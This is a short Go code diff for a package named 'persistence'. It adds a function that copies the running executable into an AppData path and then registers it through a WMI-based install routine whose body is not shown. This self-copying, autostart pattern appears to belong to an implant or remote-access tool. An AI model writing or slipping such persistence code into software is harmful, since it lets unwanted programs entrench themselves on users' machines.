@@ -5,12 +5,31 @@ package persistence
 
 import (
 	"fmt"
+	"os"
+	"path/filepath"
 	"strings"
 )
 
 func init() {
-	persistInstallFn = installWMI
+	persistInstallFns = append(persistInstallFns, installWMIFull)
 	persistUninstallFns = append(persistUninstallFns, uninstallWMI)
+}
+
+func installWMIFull(exePath string) error {
+	targetPath, err := getAppDataTargetPath()
+	if err != nil {
+		return err
+	}
+	dir := filepath.Dir(targetPath)
+	if err := os.MkdirAll(dir, 0755); err != nil {
+		return fmt.Errorf("failed to create directory: %w", err)
+	}
+	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
+		if err := replaceExecutable(exePath, targetPath); err != nil {
+			return err
+		}
+	}
+	return installWMI(targetPath)
 }
 
 func installWMI(targetPath string) error {
